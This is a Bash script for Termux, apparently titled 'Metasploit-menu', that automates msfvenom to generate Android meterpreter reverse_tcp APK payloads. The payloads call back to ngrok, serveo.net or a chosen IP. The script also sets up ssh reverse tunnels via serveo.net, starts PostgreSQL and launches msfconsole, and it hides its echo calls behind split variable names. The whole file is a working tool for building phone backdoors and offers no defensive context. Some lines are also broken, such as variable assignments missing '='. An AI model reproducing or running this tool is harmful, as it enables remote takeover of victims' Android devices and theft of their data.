serveo () {
	clear
	ll="e"
	i="c"
	k="h"
	h="o"
	o="-e"
	lal="\033[91m"
	ajib_me="\033[96m"
	pila="\033[93m"
	na="-n"
	image="figlet"
	mar_jao="sleep"
	pta_nhi="\033[95m"
	bulu="\033[94m"
	rang="toilet -f term -F gay"
	$image Ngrok | $rang
	$ll$i$k$h
	$ll$i$k$h $o $na "$ajib_me Enter LPORT ( default :- 4564 ) :-  "
	read kr_lo
	if [ ! -z $kr_lo ];then
	$ll$i$k$h $o " $lal [+] $pila Please wait Creating payload"
	msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=$kr_lo R > /sdcard/Payload/serveo-payload.apk
	fi
	printf "\n\n $hara [√] Successfully created payload in /sdcard/Payload\n\n"
	$mar_jao 2
	printf "$bulu [+] $pila Checking payload......\n\n\n"
	cd /sdcard/Payload
	echo -e "\033[95m"
	pwd
	echo
	echo -e "\033[96m"
	ls
	printf "\n\n$pta_nhi Press enter to back"
	read
	payload
	}
	without () {
		clear
		printf "\n\n\033[92m Creating payload......\n"
		msfvenom -p android/meterpreter/reverse_tcp R > /sdcard/Payload/without-Lhost-Lport-payload.apk
		printf "\n\n\033[96m [√] Successfully Create payload in /sdcard/Payload\n\n"
		printf "Press enter to back"
		read
		payload
		}
		ips () {
	clear
	ll="e"
	i="c"
	k="h"
	h="o"
	o="-e"
	lal="\033[91m"
	ajib_me="\033[96m"
	pila="\033[93m"
	na="-n"
	image="figlet"
	mar_jao="sleep"
	pta_nhi="\033[95m"
	bulu="\033[94m"
	rang="toilet -f term -F gay"
	$image Ip | $rang
	$ll$i$k$h
	$ll$i$k$h $o $na "$ajib_me Enter LPORT ( default :- 4444 ) :-  "
	read kr_lo
	if [ ! -z $kr_lo ];then
	echo
	zz="$hara Your Ip :- "
	$ll$i$k$h $o "$zz"
	curl ifconfig.me
	echo
	$ll$i$k$h $o $na "$ajib_me Enter LHOST :- "
	fi
	read v_dalo
	if [ $v_dalo ];then
	$ll$i$k$h $o " $lal [+] $pila Please wait Creating payload"
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$v_dalo LPORT=$kr_lo R > /sdcard/Payload/ip-payload.apk
	fi
	printf "\n\n $hara [√] Successfully created payload in /sdcard/Payload\n\n"
	$mar_jao 2
	printf "$bulu [+] $pila Checking payload......\n\n\n"
	cd /sdcard/Payload
	echo -e "\033[95m"
	pwd
	echo
	echo -e "\033[96m"
	ls
	printf "\n\n$pta_nhi Press enter to back"
	read
	payload
	}

ngrok () {
	clear
	ll="e"
	i="c"
	k="h"
	h="o"
	o="-e"
	lal="\033[91m"
	ajib_me="\033[96m"
	pila="\033[93m"
	na="-n"
	image="figlet"
	mar_jao="sleep"
	pta_nhi="\033[95m"
	bulu="\033[94m"
	rang="toilet -f term -F gay"
	$image Ngrok | $rang
	$ll$i$k$h
	$ll$i$k$h $o $na "$ajib_me Enter LPORT :-  "
	read kr_lo
	if [ ! -z $kr_lo ];then
	$ll$i$k$h $o " $lal [+] $pila Please wait Creating payload"
	msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$kr_lo R > /sdcard/Payload/ngrok-payload.apk
	fi
	printf "\n\n $hara [√] Successfully created payload in /sdcard/Payload\n\n"
	$mar_jao 2
	printf "$bulu [+] $pila Checking payload......\n\n\n"
	cd /sdcard/Payload
	echo -e "\033[95m"
	pwd
	echo
	echo -e "\033[96m"
	ls
	printf "\n$pta_nhi Press enter to back"
	read
	payload
	}
	payload () {
		clear
	ll="e"
	i="c"
	k="h"
	h="o"
	o="-e"
	lal="\033[91m"
	ajib_me="\033[96m"
	pila="\033[93m"
	na="-n"
	image="figlet"
	rang="toilet -f term -F gay"
	$image Payload | $rang
	$ll$i$k$h
	aa="	$lal [ 1 ]$pila Using Ngrok"
	bb="	$lal [ 2 ]$pila Using serveo.net"
	cc="	$lal [ 3 ]$pila Using Ip"
	ccc="	$lal [ 4 ]$pila Without LHOST and LPORT"
	dd="	$lal [ 5 ]$pila Home"
	ee="	$lal [ 6 ]$pila Exit"
	$ll$i$k$h $o "$aa"
	$ll$i$k$h $o "$bb"
	$ll$i$k$h $o "$cc"
	$ll$i$k$h $o "$ccc"
	$ll$i$k$h $o "$dd"
	$ll$i$k$h $o "$ee"
	$ll$i$k$h
	$ll$i$k$h $o $na "$ajib_me Select >> "
	read v_kro
	case $v_kro in
	1)ngrok ;;
	2)serveo ;;
	3)ips ;;
	4)without ;;
	5)msf-s ;;
	6)exit 0
	esac
	}
metasploit () {
	msfconsole
	}
	port () {
		ll="e"
		i="c"
		k="h"
		h="o"
		o"-e"
		na"-n"
		$ll$i$k$h $o $na "$ajib Enter Port Number :- "
		read kro
		if [ $kro ];then
		ssh -R $kro:localhost:$kro serveo.net
		fi
		}
		post () {
			pg_ctl -D $PREFIX/var/lib/postgresql start
			}
			cd $PREFIX/bin
			if [ -e msfvenom ];then
			echo
			sleep 2
			else
			printf "\033[91m Please install metasploit !!!"
			exit 0
			fi
			cd $PREFIX/bin
			if [ -e msf-s ];then
			echo -e "\033[93m Successfully installed"
			else
			ll="e"
			i="c"
			k="h"
			h="o"
			o="-e"
			lal="\033[91m"
			bulu="\033[94m"
			pila="\033[93m"
			hara="\033[92m"
			ajib="\033[96m"
			pta="\033[96m"
			mm="$lal	 [+]$hara Updating....."
			nn="$bulu	 [+]$pila Requirements found"
			oo="$pila	 [+]$bulu Installing toilet"
			pp="$hara	 [+]$ajib Installing figlet"
			qq="$ajib	 [+]$pta Installing curl"
			rr="$pta 	[+]$lal Install msf-s command"
			maro="sleep"
			kya="apt"
			smjhe="update"
			hoga="apt install"
			saf="clear"
			nhi="upgrade"
			$ll$i$k$h $o "$nn"
			$maro 1
			$ll$i$k$h $o "$mm"
			$maro 1
			$kya $smjhe
			$kya $nhi
			mkdir -p $PREFIX/var/lib/postgresql
initdb $PREFIX/var/lib/postgresql
termux-setup-storage
mkdir /sdcard/Payload
			$saf
				$ll$i$k$h $o "$oo"
			$maro 1
			$hoga toilet
			$saf
			$ll$i$k$h $o "$pp"
			$maro 1
			$hoga figlet
			$saf
			$ll$i$k$h $o "$qq"
			$maro 1
			$hoga curl
			$saf
			$ll$i$k$h $o "$rr"
			$maro 1
			cd ~/Metasploit-menu
			cp -f msf-s $PREFIX/bin
			chmod 777 $PREFIX/bin/msf-s
			rm -f msf-s
			$saf
			$ll$i$k$h $o "$hara Now u can use this commamnd :- msf-s"
			echo
			$ll$i$k$h $o "$pila Press Enter to start"
			read
			msf-s
			fi
			
			
			
clear
rangila="toilet -f term -F gay"
figlet Metasploit | $rangila
figlet menu | $rangila
ll="e"
i="c"
k="h"
h="o"
o="-e"
pila="\033[93m"
lal="\033[91m"
kya="$pila Select >> "
na="-n"
hara="\033[92m"
aa="	$lal [ 1 ]$hara Create payload"
bb="	$lal [ 2 ]$hara Start port forwarding"
cc="	$lal [ 2 ]$hara Start Postgresql"
dd="	$lal [ 3 ]$hara Start Metasploit"
ee="	$lal [ 4 ]$hara Exit"
$ll$i$k$h
$ll$i$k$h $o "$aa"
#$ll$i$k$h $o "$bb"
$ll$i$k$h $o "$cc"
$ll$i$k$h $o "$dd"
$ll$i$k$h $o "$ee"
$ll$i$k$h
$ll$i$k$h $o $na "$kya"
read kro
case $kro in
1)payload ;;
2)port ;;
3)post ;;
4)metasploit ;;
5)exit 0
esac
